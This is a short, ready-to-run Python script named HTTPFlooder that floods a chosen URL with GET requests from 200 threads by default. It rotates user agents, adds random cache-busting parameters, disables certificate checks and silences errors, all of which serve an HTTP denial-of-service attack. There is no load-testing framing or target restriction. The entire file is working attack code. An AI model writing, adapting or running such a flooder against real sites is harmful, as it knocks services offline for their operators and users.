#!/usr/bin/env python3

import sys
import time
import random
import argparse
import threading
import requests
from concurrent.futures import ThreadPoolExecutor

requests.packages.urllib3.disable_warnings()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
]

class HTTPFlooder:
    def __init__(self, url, duration, thread_id):
        self.url = url
        self.duration = duration
        self.thread_id = thread_id
        self.running = True
        self.count = 0
    
    def run(self):
        end_time = time.time() + self.duration
        
        while time.time() < end_time and self.running:
            try:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "X-Requested-With": "XMLHttpRequest",
                    "Cache-Control": "no-cache"
                }
                
                params = {
                    "t": random.randint(100000, 999999),
                    "r": random.choice(["ajax", "api", "view", "load"])
                }
                
                response = requests.get(
                    self.url,
                    headers=headers,
                    params=params,
                    timeout=2,
                    verify=False
                )
                response.close()
                self.count += 1
                
            except:
                pass
    
    def stop(self):
        self.running = False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--duration", type=int, default=60)
    parser.add_argument("--threads", type=int, default=200)
    args = parser.parse_args()
    
    flooders = []
    
    for i in range(args.threads):
        f = HTTPFlooder(args.url, args.duration, i)
        t = threading.Thread(target=f.run)
        t.start()
        flooders.append((f, t))
    
    time.sleep(args.duration)
    
    for f, t in flooders:
        f.stop()
    
    for f, t in flooders:
        t.join(timeout=1)
    
    total = sum(f.count for f, _ in flooders)
    sys.stderr.write(f"\n[HTTP] Completed: {total} requests\n")

if __name__ == "__main__":
    main()
